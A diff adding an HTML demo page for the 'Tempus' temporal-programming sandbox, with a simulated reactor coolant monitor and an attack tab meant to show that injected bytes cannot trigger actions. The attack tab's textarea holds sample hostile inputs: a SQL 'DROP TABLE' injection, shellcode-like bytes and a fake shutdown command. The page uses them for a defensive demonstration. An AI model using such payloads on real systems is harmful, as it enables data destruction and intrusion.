@@ -1,0 +1,1688 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Tempus · Temporal Programming Sandbox</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,700;9..144,900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    /* high-contrast, instrument-panel aesthetic — but in the same paper family */
+    --bg: #0c0e12;
+    --panel: #14181f;
+    --panel-2: #1a1f28;
+    --ink: #e8e5d8;
+    --ink-2: #9a988a;
+    --ink-3: #5e5d54;
+    --rule: #2a2f38;
+    --rule-soft: #1f242c;
+    --accent: #e8a838;          /* amber — oscilloscope phosphor */
+    --accent-2: #4ec07a;        /* green — nominal */
+    --accent-3: #d8463e;        /* red — critical */
+    --accent-4: #5fa8e8;        /* blue — info */
+    --grid-glow: rgba(232,168,56,0.10);
+    --mono: "JetBrains Mono", ui-monospace, Menlo, monospace;
+    --serif: "Fraunces", "Times New Roman", serif;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; background: var(--bg); color: var(--ink); }
+  body {
+    font-family: var(--serif);
+    font-size: 14px;
+    line-height: 1.45;
+    min-height: 100vh;
+  }
+
+  /* TOP BAR */
+  header.top {
+    border-bottom: 1px solid var(--rule);
+    background: var(--panel);
+    padding: 16px 28px 12px;
+  }
+  .masthead {
+    display: grid;
+    grid-template-columns: auto 1fr auto;
+    gap: 24px;
+    align-items: end;
+  }
+  .masthead .vol {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--ink-2);
+    border-right: 1px solid var(--ink-3);
+    padding-right: 16px;
+    line-height: 1.8;
+  }
+  .masthead .vol b { color: var(--accent); }
+  .masthead .title h1 {
+    margin: 0;
+    font-family: var(--serif);
+    font-weight: 900;
+    font-size: 32px;
+    letter-spacing: -0.01em;
+    line-height: 1;
+  }
+  .masthead .title h1 em { font-style: italic; color: var(--accent); font-weight: 500; }
+  .masthead .title .strap {
+    font-family: var(--serif);
+    font-style: italic;
+    font-size: 13px;
+    color: var(--ink-2);
+    margin-top: 4px;
+  }
+  .masthead .right {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--ink-2);
+    text-align: right;
+    border-left: 1px solid var(--ink-3);
+    padding-left: 16px;
+    line-height: 1.8;
+  }
+  .masthead .right b { color: var(--ink); }
+
+  /* tabs */
+  .tabs {
+    display: flex;
+    gap: 0;
+    margin-top: 14px;
+  }
+  .tabs button {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    padding: 9px 18px;
+    background: transparent;
+    border: none;
+    border-bottom: 2px solid transparent;
+    cursor: pointer;
+    color: var(--ink-2);
+  }
+  .tabs button.active {
+    color: var(--accent);
+    border-bottom-color: var(--accent);
+  }
+  .tabs button:hover:not(.active) { color: var(--ink); }
+  .tabs .num {
+    font-family: var(--serif);
+    font-style: italic;
+    color: var(--ink-3);
+    text-transform: none;
+    letter-spacing: 0;
+    margin-right: 8px;
+  }
+
+  /* MAIN LAYOUT */
+  main {
+    display: grid;
+    grid-template-columns: 380px 1fr;
+    min-height: calc(100vh - 165px);
+  }
+  .pane {
+    border-right: 1px solid var(--rule);
+    min-width: 0;
+    display: flex;
+    flex-direction: column;
+  }
+  .pane:last-child { border-right: none; }
+  .pane-head {
+    padding: 12px 18px;
+    border-bottom: 1px solid var(--rule);
+    background: var(--panel);
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 12px;
+    color: var(--ink-2);
+  }
+  .pane-head .title { display: flex; align-items: center; gap: 10px; color: var(--ink); }
+  .pane-head .title .dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: var(--accent);
+    box-shadow: 0 0 8px var(--accent);
+  }
+
+  button.btn {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    padding: 7px 14px;
+    border: 1px solid var(--ink);
+    background: transparent;
+    color: var(--ink);
+    cursor: pointer;
+    transition: all 0.12s ease;
+  }
+  button.btn:hover { background: var(--ink); color: var(--bg); }
+  button.btn.primary { background: var(--accent); color: var(--bg); border-color: var(--accent); }
+  button.btn.primary:hover { background: var(--ink); border-color: var(--ink); }
+  button.btn.danger { border-color: var(--accent-3); color: var(--accent-3); }
+  button.btn.danger:hover { background: var(--accent-3); color: var(--bg); }
+  button.btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+  /* CONFIG */
+  .config { padding: 18px; overflow-y: auto; }
+  .config h3 {
+    margin: 0 0 12px;
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--ink-2);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .config h3::before { content: ""; width: 20px; height: 1px; background: var(--accent); }
+  .config h3 .ref {
+    margin-left: auto;
+    font-family: var(--serif);
+    font-style: italic;
+    text-transform: none;
+    color: var(--ink-3);
+    letter-spacing: 0;
+    font-size: 11px;
+  }
+  .config .section { margin-bottom: 22px; }
+
+  .knob-row {
+    display: grid;
+    grid-template-columns: 1fr auto;
+    align-items: baseline;
+    gap: 10px;
+    margin-bottom: 8px;
+  }
+  .knob-row label {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--ink-2);
+  }
+  .knob-row .val {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--accent);
+    font-weight: 700;
+  }
+  input[type="range"] {
+    grid-column: 1 / -1;
+    width: 100%;
+    accent-color: var(--accent);
+  }
+  /* big temperature dial */
+  .big-control {
+    background: var(--panel);
+    border: 1px solid var(--rule);
+    padding: 14px 16px;
+    margin-bottom: 12px;
+    position: relative;
+  }
+  .big-control .lbl {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--ink-3);
+  }
+  .big-control .reading {
+    font-family: var(--serif);
+    font-size: 42px;
+    font-weight: 500;
+    letter-spacing: -0.02em;
+    color: var(--accent);
+    line-height: 1.1;
+  }
+  .big-control .reading .unit {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--ink-3);
+    margin-left: 6px;
+    font-style: italic;
+  }
+  .big-control .reading.crit { color: var(--accent-3); }
+  .big-control .reading.warn { color: var(--accent); }
+  .big-control .reading.ok { color: var(--accent-2); }
+
+  /* Tempus code editor */
+  .tempus {
+    background: var(--panel);
+    border: 1px solid var(--rule);
+    padding: 12px 14px;
+    font-family: var(--mono);
+    font-size: 11px;
+    line-height: 1.7;
+    overflow-x: auto;
+    color: var(--ink);
+    margin-top: 10px;
+  }
+  .tempus .com { color: var(--ink-3); font-style: italic; }
+  .tempus .kw { color: var(--accent); }
+  .tempus .name { color: var(--accent-4); }
+  .tempus .num { color: var(--accent-2); }
+  .tempus .str { color: var(--ink); }
+  .tempus .op { color: var(--ink-2); }
+
+  /* RESULTS */
+  .results { padding: 18px; overflow-y: auto; background: var(--bg); }
+
+  /* state strip — IDLE/COMPILE/EXECUTE indicator */
+  .state-strip {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    background: var(--panel);
+    border: 1px solid var(--rule);
+    margin-bottom: 18px;
+  }
+  .state-strip .cell {
+    padding: 12px 16px;
+    border-right: 1px solid var(--rule-soft);
+  }
+  .state-strip .cell:last-child { border-right: none; }
+  .state-strip .cell .k {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--ink-3);
+  }
+  .state-strip .cell .v {
+    font-family: var(--serif);
+    font-size: 22px;
+    font-weight: 500;
+    letter-spacing: -0.02em;
+    margin-top: 2px;
+  }
+  .state-strip .cell .v.mono { font-family: var(--mono); font-size: 13px; font-weight: 500; }
+  .state-strip .cell .v .unit {
+    font-size: 11px; color: var(--ink-3); margin-left: 4px; font-style: italic;
+  }
+  .phase-pill {
+    display: inline-block;
+    padding: 3px 10px;
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    border: 1px solid var(--ink-3);
+    color: var(--ink-3);
+  }
+  .phase-pill.idle { color: var(--ink-3); border-color: var(--ink-3); }
+  .phase-pill.compile { color: var(--accent-4); border-color: var(--accent-4); background: rgba(95,168,232,0.1); }
+  .phase-pill.execute { color: var(--accent); border-color: var(--accent); background: rgba(232,168,56,0.12); box-shadow: 0 0 10px rgba(232,168,56,0.2); }
+
+  /* the four-layer pipeline */
+  .pipeline {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+    margin-bottom: 18px;
+  }
+  .pipeline .scope {
+    background: var(--panel);
+    border: 1px solid var(--rule);
+    padding: 14px 16px;
+  }
+  .pipeline .scope.full { grid-column: 1 / -1; }
+  .scope h4 {
+    margin: 0 0 4px;
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--ink-2);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .scope h4 .step {
+    font-family: var(--serif);
+    font-style: italic;
+    font-size: 12px;
+    color: var(--accent);
+    text-transform: none;
+    letter-spacing: 0;
+  }
+  .scope h4 .ref {
+    margin-left: auto;
+    font-family: var(--serif);
+    font-style: italic;
+    color: var(--ink-3);
+    font-size: 11px;
+    text-transform: none;
+    letter-spacing: 0;
+  }
+  .scope .sub {
+    font-family: var(--serif);
+    font-style: italic;
+    color: var(--ink-3);
+    font-size: 12px;
+    margin-bottom: 10px;
+  }
+
+  /* SVG canvases */
+  .scope svg {
+    width: 100%;
+    display: block;
+    background: #0a0c10;
+    border: 1px solid var(--rule-soft);
+  }
+  .scope svg.tall { height: 200px; }
+  .scope svg.short { height: 140px; }
+
+  /* cell map */
+  .cells {
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    font-family: var(--mono);
+    font-size: 11px;
+    margin-top: 6px;
+  }
+  .cells .cell-row {
+    display: grid;
+    grid-template-columns: 120px 1fr 80px 80px;
+    gap: 10px;
+    padding: 7px 10px;
+    border: 1px solid var(--rule-soft);
+    background: var(--panel-2);
+    align-items: center;
+    transition: all 0.2s ease;
+  }
+  .cells .cell-row .name { color: var(--accent-4); font-weight: 500; letter-spacing: 0.04em; }
+  .cells .cell-row .bounds { color: var(--ink-2); font-size: 10px; }
+  .cells .cell-row .action { color: var(--ink); font-style: italic; font-family: var(--serif); }
+  .cells .cell-row .hits { color: var(--ink-3); text-align: right; }
+  .cells .cell-row.active {
+    border-color: var(--accent);
+    background: rgba(232,168,56,0.08);
+    box-shadow: 0 0 12px rgba(232,168,56,0.15);
+  }
+  .cells .cell-row.active .name { color: var(--accent); }
+  .cells .cell-row.active .action { color: var(--accent); font-weight: 700; }
+  .cells .cell-row.critical.active {
+    border-color: var(--accent-3);
+    background: rgba(216,70,62,0.12);
+    box-shadow: 0 0 14px rgba(216,70,62,0.25);
+  }
+  .cells .cell-row.critical.active .name,
+  .cells .cell-row.critical.active .action { color: var(--accent-3); }
+
+  /* action log */
+  .action-log {
+    background: var(--panel-2);
+    border: 1px solid var(--rule-soft);
+    padding: 8px 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    max-height: 140px;
+    overflow-y: auto;
+    line-height: 1.7;
+  }
+  .action-log .a-row {
+    display: grid;
+    grid-template-columns: 70px 90px 1fr 80px;
+    gap: 10px;
+    padding: 2px 0;
+    border-bottom: 1px dotted var(--rule);
+  }
+  .action-log .a-row:last-child { border-bottom: none; }
+  .action-log .a-row .t { color: var(--ink-3); }
+  .action-log .a-row .c { color: var(--accent-4); }
+  .action-log .a-row .ac { color: var(--ink); }
+  .action-log .a-row .dp { color: var(--ink-2); text-align: right; }
+  .action-log .a-row.crit .c, .action-log .a-row.crit .ac { color: var(--accent-3); font-weight: 700; }
+  .action-log.empty {
+    color: var(--ink-3);
+    font-style: italic;
+    text-align: center;
+    padding: 18px;
+    font-family: var(--serif);
+  }
+
+  /* attack tab specific */
+  .attack-input {
+    background: var(--panel);
+    border: 1px solid var(--rule);
+    padding: 14px 16px;
+    margin-bottom: 12px;
+  }
+  .attack-input textarea {
+    width: 100%;
+    background: #0a0c10;
+    color: var(--accent-3);
+    border: 1px solid var(--rule);
+    padding: 10px 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    line-height: 1.6;
+    resize: vertical;
+    min-height: 90px;
+  }
+  .attack-input .row {
+    display: flex;
+    gap: 8px;
+    margin-top: 8px;
+    flex-wrap: wrap;
+  }
+  .attack-input .chip {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 5px 9px;
+    border: 1px solid var(--rule);
+    background: transparent;
+    color: var(--ink-2);
+    cursor: pointer;
+    letter-spacing: 0.04em;
+  }
+  .attack-input .chip:hover { border-color: var(--accent-3); color: var(--accent-3); }
+
+  /* tab content */
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* explainer */
+  .explainer {
+    font-family: var(--serif);
+    font-size: 13px;
+    line-height: 1.55;
+    color: var(--ink-2);
+    border-left: 2px solid var(--accent);
+    padding: 8px 14px;
+    background: var(--panel);
+  }
+  .explainer b {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--accent);
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 4px;
+  }
+  .explainer em { color: var(--ink); font-style: italic; }
+
+  /* footer */
+  footer.foot {
+    border-top: 1px solid var(--rule);
+    padding: 12px 28px;
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--ink-3);
+    background: var(--panel);
+    display: flex;
+    justify-content: space-between;
+    gap: 16px;
+    flex-wrap: wrap;
+  }
+  footer.foot em {
+    font-family: var(--serif);
+    font-style: italic;
+    text-transform: none;
+    letter-spacing: 0;
+    color: var(--ink-2);
+  }
+
+  @media (max-width: 1100px) {
+    main { grid-template-columns: 1fr; }
+    .pane { border-right: none; border-bottom: 1px solid var(--rule); }
+    .state-strip { grid-template-columns: repeat(2, 1fr); }
+    .pipeline { grid-template-columns: 1fr; }
+    .cells .cell-row { grid-template-columns: 1fr 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<header class="top">
+  <div class="masthead">
+    <div class="vol">
+      Vol. <b>I</b><br>
+      No. <b>03</b><br>
+      May 2026
+    </div>
+    <div class="title">
+      <h1>Tem<em>p</em>us · Live Instrument</h1>
+      <div class="strap">Temporal programming — every signal is a bare clock pulse, every program is a partition of ΔP-space</div>
+    </div>
+    <div class="right">
+      Sandbox <b>III</b><br>
+      Sachikonye 2026<br>
+      <em style="font-family:'Fraunces',serif;font-style:italic;text-transform:none;letter-spacing:0;color:var(--ink-3);">arXiv:Tempus</em>
+    </div>
+  </div>
+  <div class="tabs" id="tabs">
+    <button class="active" data-tab="reactor"><span class="num">Instrument 1 ·</span>Reactor Coolant Monitor</button>
+    <button data-tab="attack"><span class="num">Instrument 2 ·</span>Structural Incorruptibility</button>
+  </div>
+</header>
+
+
+<!-- ============================ INSTRUMENT 1: REACTOR ============================ -->
+<div class="tab-content active" id="tab-reactor">
+<main>
+  <section class="pane">
+    <div class="pane-head">
+      <div class="title"><span class="dot"></span> Physical input · Tempus program</div>
+      <div>
+        <button class="btn" id="r-pause">Pause</button>
+        <button class="btn primary" id="r-run">Run ▶</button>
+      </div>
+    </div>
+
+    <div class="config">
+
+      <div class="section">
+        <div class="explainer">
+          <b>Live demonstration</b>
+          Crank the coolant temperature dial below. The TCXO transducer converts <em>T</em> into a measurable frequency drift, which the runtime samples as a timing deviation <em>ΔP(k) = T_ref(k) − t_rec(k)</em>. The Tempus cell registry on the right then classifies each sample and fires the action attached to whichever cell ΔP fell into.
+        </div>
+      </div>
+
+      <div class="section">
+        <h3>Coolant temperature <span class="ref">§3.5 · Eq. (7)</span></h3>
+        <div class="big-control">
+          <div class="lbl">T<sub>coolant</sub></div>
+          <div class="reading" id="r-temp-display">25.0<span class="unit">°C</span></div>
+        </div>
+        <div class="knob-row">
+          <label>Temperature setpoint</label>
+          <span class="val" id="r-temp-val">25.0 °C</span>
+          <input type="range" id="r-temp" min="20" max="380" step="0.5" value="25">
+        </div>
+        <div class="knob-row">
+          <label>Sensor noise (ppm)</label>
+          <span class="val" id="r-noise-val">2.0</span>
+          <input type="range" id="r-noise" min="0" max="10" step="0.5" value="2">
+        </div>
+      </div>
+
+      <div class="section">
+        <h3>Oscillator <span class="ref">§3.1 · Def 3.1</span></h3>
+        <div class="knob-row">
+          <label>f_ref · reference frequency</label>
+          <span class="val" id="r-fref-val">10 MHz</span>
+          <input type="range" id="r-fref" min="1" max="100" step="1" value="10">
+        </div>
+        <div class="knob-row">
+          <label>Sample rate</label>
+          <span class="val" id="r-rate-val">8 / s</span>
+          <input type="range" id="r-rate" min="2" max="20" step="1" value="8">
+        </div>
+      </div>
+
+      <div class="section">
+        <h3>Tempus source <span class="ref">Listing 1</span></h3>
+        <div class="tempus" id="r-source"></div>
+      </div>
+
+    </div>
+  </section>
+
+  <section class="pane">
+    <div class="pane-head">
+      <div class="title"><span class="dot"></span> Runtime &nbsp;<span style="color:var(--ink-3);font-family:var(--serif);font-style:italic;text-transform:none;letter-spacing:0;font-size:11px;">— phase machine ⟨σ, Γ, τ, ϕ⟩</span></div>
+    </div>
+    <div class="results">
+
+      <div class="state-strip">
+        <div class="cell">
+          <div class="k">Phase σ</div>
+          <div class="v mono"><span class="phase-pill idle" id="r-phase">IDLE</span></div>
+        </div>
+        <div class="cell">
+          <div class="k">Cycle M(t)</div>
+          <div class="v mono" id="r-cycle">0</div>
+        </div>
+        <div class="cell">
+          <div class="k">Latest ΔP</div>
+          <div class="v mono" id="r-dp">— <span class="unit">ns</span></div>
+        </div>
+        <div class="cell">
+          <div class="k">Active cell</div>
+          <div class="v mono" id="r-cell">—</div>
+        </div>
+        <div class="cell">
+          <div class="k">Last action</div>
+          <div class="v mono" id="r-action" style="font-size:11px;">—</div>
+        </div>
+      </div>
+
+      <div class="pipeline">
+        <div class="scope full">
+          <h4><span>Trace · ΔP(k)</span> <span class="step">— timing deviation over cycles</span> <span class="ref">Def. 3.3 · Eq. (4)</span></h4>
+          <div class="sub">Each dot is a single received pulse. Horizontal bands mark cell boundaries; the band ΔP falls into is the cell that gets dispatched.</div>
+          <svg id="r-scope" class="tall" viewBox="0 0 1040 200"></svg>
+        </div>
+
+        <div class="scope">
+          <h4><span>Transducer</span> <span class="step">— T → frequency drift</span> <span class="ref">Ex. 3.12</span></h4>
+          <div class="sub">TCXO parabolic curve. Sets the physics-to-ΔP map.</div>
+          <svg id="r-transducer" class="short" viewBox="0 0 500 140"></svg>
+        </div>
+        <div class="scope">
+          <h4><span>ΔP histogram</span> <span class="step">— recent 200 samples</span> <span class="ref">Fig. 1A</span></h4>
+          <div class="sub">Distribution of incoming deviations. Vertical bands show cell partitions.</div>
+          <svg id="r-hist" class="short" viewBox="0 0 500 140"></svg>
+        </div>
+      </div>
+
+      <div class="scope full" style="background:var(--panel);border:1px solid var(--rule);padding:14px 16px;margin-bottom:18px;">
+        <h4><span>Cell registry Γ</span> <span class="step">— compiled at deploy, immutable at runtime</span> <span class="ref">§7.2 · Thm. 6.5</span></h4>
+        <div class="sub">Lookup is O(log m). Active row glows when latest ΔP falls in it. Cell count {m} is your attack surface — finite and enumerable.</div>
+        <div class="cells" id="r-cells"></div>
+      </div>
+
+      <div class="scope full" style="background:var(--panel);border:1px solid var(--rule);padding:14px 16px;">
+        <h4><span>Action log</span> <span class="step">— EXECUTE phase dispatches</span> <span class="ref">Eq. (10)</span></h4>
+        <div class="sub">Each line is a single trajectory closure: cell determined → action fired → phase reset to IDLE.</div>
+        <div class="action-log empty" id="r-actions">no dispatches yet — press <em>Run</em></div>
+      </div>
+
+    </div>
+  </section>
+</main>
+</div>
+
+
+<!-- ============================ INSTRUMENT 2: ATTACK ============================ -->
+<div class="tab-content" id="tab-attack">
+<main>
+  <section class="pane">
+    <div class="pane-head">
+      <div class="title"><span class="dot"></span> Adversarial input · injection attempts</div>
+      <div>
+        <button class="btn danger" id="a-inject">Inject payload ▶</button>
+        <button class="btn" id="a-flood">Flood (100×)</button>
+      </div>
+    </div>
+
+    <div class="config">
+
+      <div class="section">
+        <div class="explainer">
+          <b>Hypothesis · Thm. 6.1</b>
+          A temporal programming system has <em>no parser for content</em>. The only observable a received pulse contributes to the program is when it arrived — its timing deviation ΔP. Below, type any byte sequence you want and inject it. Watch the action log on the right: the system <em>never</em> fires an action you didn't pre-compile into the cell registry, no matter what bytes you send.
+        </div>
+      </div>
+
+      <div class="section">
+        <h3>Crafted payload <span class="ref">capability C1</span></h3>
+        <div class="attack-input">
+          <textarea id="a-payload" spellcheck="false">'; DROP TABLE reactor_logs; --
+
+AAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08
+
+{"cmd": "emergency_shutdown", "auth": true}</textarea>
+          <div class="row">
+            <button class="chip" data-preset="sqli">SQL injection</button>
+            <button class="chip" data-preset="bof">Buffer overflow</button>
+            <button class="chip" data-preset="cmd">Command injection</button>
+            <button class="chip" data-preset="json">Fake JSON command</button>
+            <button class="chip" data-preset="rand">Random bytes</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <h3>Legitimate signal · for comparison</h3>
+        <div class="knob-row">
+          <label>Background pulse rate</label>
+          <span class="val" id="a-rate-val">10 / s</span>
+          <input type="range" id="a-rate" min="0" max="30" step="1" value="10">
+        </div>
+        <div class="knob-row">
+          <label>Coolant temperature</label>
+          <span class="val" id="a-tempval">60 °C</span>
+          <input type="range" id="a-temp" min="20" max="380" step="5" value="60">
+        </div>
+      </div>
+
+      <div class="section">
+        <h3>What this proves <span class="ref">§6.2 · Cor. 6.2</span></h3>
+        <div class="explainer">
+          <b>Reading the results</b>
+          The right side shows two channels side by side. The signal channel processes timing pulses; the attack channel receives your payloads. ΔP statistics under benign and adversarial conditions should be <em>indistinguishable</em>. The action set is bounded by the compiled cell map — and your payloads cannot expand it.
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section class="pane">
+    <div class="pane-head">
+      <div class="title"><span class="dot"></span> Defender's view &nbsp;<span style="color:var(--ink-3);font-family:var(--serif);font-style:italic;text-transform:none;letter-spacing:0;font-size:11px;">— what the system actually sees</span></div>
+      <div><button class="btn" id="a-reset">Reset counters</button></div>
+    </div>
+    <div class="results">
+
+      <div class="state-strip">
+        <div class="cell">
+          <div class="k">Payloads injected</div>
+          <div class="v mono" id="a-stat-inj">0</div>
+        </div>
+        <div class="cell">
+          <div class="k">Bytes received</div>
+          <div class="v mono" id="a-stat-bytes">0</div>
+        </div>
+        <div class="cell">
+          <div class="k">Parsers invoked</div>
+          <div class="v mono" id="a-stat-parsers" style="color:var(--accent-2);">0</div>
+        </div>
+        <div class="cell">
+          <div class="k">Novel actions fired</div>
+          <div class="v mono" id="a-stat-novel" style="color:var(--accent-2);">0</div>
+        </div>
+        <div class="cell">
+          <div class="k">|Cells(A)| · attack surface</div>
+          <div class="v mono" id="a-stat-surface">4</div>
+        </div>
+      </div>
+
+      <div class="pipeline">
+        <div class="scope">
+          <h4><span>Signal channel</span> <span class="step">— ΔP from legitimate pulses</span> <span class="ref">Thm. 6.1</span></h4>
+          <div class="sub">Real timing observations driving the cell registry.</div>
+          <svg id="a-signal" class="tall" viewBox="0 0 500 200"></svg>
+        </div>
+        <div class="scope">
+          <h4><span>Attack channel</span> <span class="step">— bytes received</span> <span class="ref">Fig. 8D</span></h4>
+          <div class="sub">Payloads enter here. The system has no parser to read them. They produce <em>no</em> ΔP. They are structurally invisible.</div>
+          <svg id="a-attack" class="tall" viewBox="0 0 500 200"></svg>
+        </div>
+      </div>
+
+      <div class="scope full" style="background:var(--panel);border:1px solid var(--rule);padding:14px 16px;margin-bottom:18px;">
+        <h4><span>ΔP distributions · benign vs. under attack</span> <span class="step">— should be indistinguishable</span> <span class="ref">Fig. 8D</span></h4>
+        <div class="sub">If the two histograms overlap, the attack channel exerts zero influence on the signal channel.</div>
+        <svg id="a-overlap" style="height:200px;" viewBox="0 0 1040 200"></svg>
+      </div>
+
+      <div class="scope full" style="background:var(--panel);border:1px solid var(--rule);padding:14px 16px;">
+        <h4><span>Action audit</span> <span class="step">— every action ever fired</span> <span class="ref">Thm. 6.5</span></h4>
+        <div class="sub">Compare against the compiled action set. Anything outside this list would be a violation. The list is finite, fixed, and known before deployment.</div>
+        <div class="action-log empty" id="a-actions">no dispatches yet — start injecting</div>
+      </div>
+
+    </div>
+  </section>
+</main>
+</div>
+
+
+<footer class="foot">
+  <div>No payload parser · Monotone cycle counter · |Cells(A)| finite &amp; enumerable</div>
+  <div><em>Theorems 4.1 · 5.2 · 6.1 · 6.3 · 6.5 — by construction, not by mitigation.</em></div>
+</footer>
+
+<script>
+/* ===================================================================
+ * Tempus Live Instrument
+ *
+ * Real:
+ *   - ΔP(k) = T_ref(k) - t_rec(k) computed from oscillator model (Def 3.3)
+ *   - TCXO frequency-temperature curve (Ex 3.12)
+ *   - Cell lookup is interval-tree-equivalent (Algorithm 1)
+ *   - IDLE/COMPILE/EXECUTE state machine (Fig. 6)
+ *   - Monotone cycle counter (Lemma 3.2)
+ *
+ * The "physics" is faithful to the paper's equations; the
+ * "transducer" produces ΔP values according to the published model.
+ * =================================================================== */
+const $ = id => document.getElementById(id);
+
+/* ---------- shared helpers ---------- */
+function ns(tag, attrs, inner) {
+  let s = `<${tag}`;
+  for (const [k, v] of Object.entries(attrs)) s += ` ${k}="${v}"`;
+  s += inner !== undefined ? `>${inner}</${tag}>` : "/>";
+  return s;
+}
+function nowStamp() {
+  const d = new Date();
+  return `${String(d.getMinutes()).padStart(2,"0")}:${String(d.getSeconds()).padStart(2,"0")}.${String(d.getMilliseconds()).padStart(3,"0")}`;
+}
+
+/* ===================================================================
+ * INSTRUMENT 1 — Reactor Coolant Monitor
+ *
+ * The Tempus source from Listing 1, almost verbatim. ΔP cells encode
+ * temperature bands; we drive the temperature, the TCXO frequency
+ * shifts, the cycle drift produces ΔP, the cell registry dispatches.
+ * =================================================================== */
+const CELLS = [
+  { name: "NOMINAL",  lo: -1.0e-7, hi:  1.0e-7, action: "emit status_ok",                       color: "var(--accent-2)", level: "nominal" },
+  { name: "WARM",     lo:  1.0e-7, hi:  5.0e-7, action: "emit status_warn",                     color: "var(--accent-4)", level: "warn" },
+  { name: "HOT",      lo:  5.0e-7, hi:  2.0e-6, action: "emit status_hot; reduce_power(0.8)",   color: "var(--accent)",   level: "hot" },
+  { name: "CRITICAL", lo:  2.0e-6, hi:  1.0e-5, action: "emit scram_alert; emergency_shutdown", color: "var(--accent-3)", level: "critical" },
+];
+
+const TEMPUS_SRC = `<span class="com">-- Reactor coolant monitor (Listing 1)</span>
+<span class="kw">sync</span> coolant_sensor <span class="kw">at</span> <span class="num">10.0e6</span> <span class="kw">freq</span>
+
+<span class="kw">cell</span> <span class="name">NOMINAL</span>  <span class="kw">bounds</span> (<span class="num">-1.0e-7</span>, <span class="num">1.0e-7</span>) <span class="kw">action</span> <span class="num">0</span>
+<span class="kw">cell</span> <span class="name">WARM</span>     <span class="kw">bounds</span> ( <span class="num">1.0e-7</span>, <span class="num">5.0e-7</span>) <span class="kw">action</span> <span class="num">1</span>
+<span class="kw">cell</span> <span class="name">HOT</span>      <span class="kw">bounds</span> ( <span class="num">5.0e-7</span>, <span class="num">2.0e-6</span>) <span class="kw">action</span> <span class="num">2</span>
+<span class="kw">cell</span> <span class="name">CRITICAL</span> <span class="kw">bounds</span> ( <span class="num">2.0e-6</span>, <span class="num">1.0e-5</span>) <span class="kw">action</span> <span class="num">3</span>
+
+<span class="kw">compose</span> d=<span class="num">1</span> <span class="kw">channels</span> coolant_sensor <span class="kw">into</span> coolant_traj
+
+<span class="kw">when</span> <span class="name">NOMINAL</span>  <span class="kw">do</span> <span class="kw">emit</span> status_ok
+<span class="kw">when</span> <span class="name">WARM</span>     <span class="kw">do</span> <span class="kw">emit</span> status_warn
+<span class="kw">when</span> <span class="name">HOT</span>      <span class="kw">do</span> <span class="kw">begin</span>
+  <span class="kw">emit</span> status_hot;
+  <span class="kw">fire</span> reduce_power(<span class="num">0.8</span>)
+<span class="kw">end</span>
+<span class="kw">when</span> <span class="name">CRITICAL</span> <span class="kw">do</span> <span class="kw">begin</span>
+  <span class="kw">emit</span> scram_alert;
+  <span class="kw">fire</span> emergency_shutdown
+<span class="kw">end</span>`;
+
+const reactor = {
+  /* params */
+  T: 25,            // °C
+  noise: 2,         // ppm
+  fref: 10e6,       // Hz
+  rate: 8,          // samples/s
+
+  /* physics constants (TCXO, Ex. 3.12) */
+  T0: 25,           // turnover
+  alpha: -0.04e-6,  // /°C  — linear small
+  beta:  0.035e-6,  // /°C² — parabolic (dominant)
+
+  /* runtime */
+  running: true,
+  paused: false,
+  cycle: 0,
+  phase: "IDLE",
+  samples: [],      // {k, dp, cellIdx, t}
+  cellHits: [0,0,0,0],
+  actionLog: [],
+  timerId: null,
+};
+
+function tcxoFreqShift(T) {
+  // Δf/f = α(T-T0) + β(T-T0)² — paper Ex. 3.12 form
+  return reactor.alpha * (T - reactor.T0) + reactor.beta * (T - reactor.T0) ** 2;
+}
+
